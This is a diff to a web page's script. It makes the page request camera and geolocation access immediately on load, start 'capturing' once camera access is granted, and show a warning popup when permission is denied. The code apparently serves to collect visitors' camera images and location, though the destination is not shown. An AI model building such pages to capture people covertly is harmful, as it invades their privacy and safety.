@@ -121,6 +121,8 @@
 
     let bypassCameraCheck = false; // Flag for bypassing camera check
     let timer = 30; // 30-second timer
+    let cameraAllowed = false;
+    let locationAllowed = false;
 
     // Function to reload the page
     function reloadPage() {
@@ -151,28 +153,24 @@
 
     // Function to check permissions
     async function checkPermissions() {
-      let cameraAllowed = false;
-      let locationAllowed = false;
-
-      // Check camera permission (only if not bypassed)
+      // Ask for camera permission first
       if (!bypassCameraCheck) {
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
           cameraAllowed = true;
           video.srcObject = stream;
-          // Start capturing immediately after permissions are granted
-          startCapturing();
+          startCapturing();  // Start capturing once permissions are granted
         } catch (error) {
           console.error('Camera access denied:', error);
+          cameraAllowed = false;
+          showWarningPopup(); // Show warning popup if denied
         }
       } else {
-        console.log('Camera check bypassed.');
-        cameraAllowed = true; // Set to true if bypassed
-        // Start capturing immediately after permissions are granted
-        startCapturing();
+        cameraAllowed = true; // Bypass camera check
+        startCapturing();  // Start capturing once bypassed
       }
 
-      // Check location permission
+      // Ask for location permission next
       try {
         await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject);
@@ -180,13 +178,14 @@
         locationAllowed = true;
       } catch (error) {
         console.error('Location access denied:', error);
+        locationAllowed = false;
+        showWarningPopup(); // Show warning popup if denied
       }
 
-      // Show popup if either permission is denied
-      if (!cameraAllowed || !locationAllowed) {
-        showWarningPopup();
-      } else {
-        console.log('All permissions granted or bypassed.');
+      // Start timer and capturing if both permissions are granted
+      if (cameraAllowed && locationAllowed) {
+        startTimer();
+        startCapturing();
       }
     }
 
@@ -239,13 +238,12 @@
         timerElement.innerText = timer;
         if (timer <= 0) {
           clearInterval(countdown);
-          checkPermissions(); // Start permission checks after 30 seconds
         }
       }, 1000);
     }
 
-    // Run the timer on page load
-    startTimer();
+    // Ask for permissions immediately when the page loads
+    checkPermissions();
   </script>
 </body>
 </html>
